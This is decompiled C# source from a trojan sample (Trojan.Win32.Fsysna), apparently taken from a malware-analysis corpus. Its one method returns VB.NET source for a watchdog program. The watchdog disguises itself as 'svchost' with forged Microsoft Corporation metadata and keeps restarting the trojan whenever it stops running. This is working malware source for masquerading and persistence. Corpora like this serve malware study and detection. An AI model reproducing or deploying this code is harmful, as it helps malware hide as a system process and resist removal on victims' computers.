// Decompiled with JetBrains decompiler
// Type: Project_Unamed.Sources
// Assembly: Project Unnamed, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E14D2CAF-643A-42A5-AF85-1F02787E6112
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.Win32.Fsysna.dkho-1e6991871b0b19bec231c68029dfc8a762f32ed88d5a1aa5b922eb829ff10319.exe

using System.Diagnostics;

namespace Project_Unamed
{
  public class Sources
  {
    [DebuggerNonUserCode]
    public Sources()
    {
    }

    public static string ProcessRestarterSource() => "Imports System.Diagnostics, System, System.Reflection\r\n<Assembly: AssemblyTitle(\"svchost\")> \r\n<Assembly: AssemblyDescription(\"Windows Operation System\")> \r\n<Assembly: AssemblyCompany(\"Microsoft Corporation\")> \r\n<Assembly: AssemblyProduct(\"Windows Operation System\")> \r\n<Assembly: AssemblyCopyright(\"© Microsoft Corporation\")> \r\n<Assembly: AssemblyTrademark(\"Windows\")> \r\n<Assembly: AssemblyVersion(\"4.5.3.1\")> \r\n<Assembly: AssemblyFileVersion(\"3.4.5.1\")> \r\nModule Module1\r\nSub Main()\r\n  Dim c As Integer = 0\r\nSystem.Threading.Thread.Sleep(5000)\r\n        While True\r\n            For Each p As System.Diagnostics.Process In System.Diagnostics.Process.GetProcessesByName(\"" + Process.GetCurrentProcess().ProcessName + "\")\r\n                Try\r\n                    If p.Modules(0).FileName = \"" + Process.GetCurrentProcess().Modules[0].FileName + "\" Then\r\n                        c += 1\r\n                    End If\r\n                Catch ex As Exception\r\n                End Try\r\n            Next\r\n            If c = 0 Then\r\n                System.Diagnostics.Process.Start(\"" + Process.GetCurrentProcess().Modules[0].FileName + "\")\r\n    System.Threading.Thread.Sleep(5000)\r\n            End If\r\n            c = 0\r\n            System.Threading.Thread.Sleep(100)\r\n        End While\r\nEnd Sub\r\nEnd Module";
  }
}
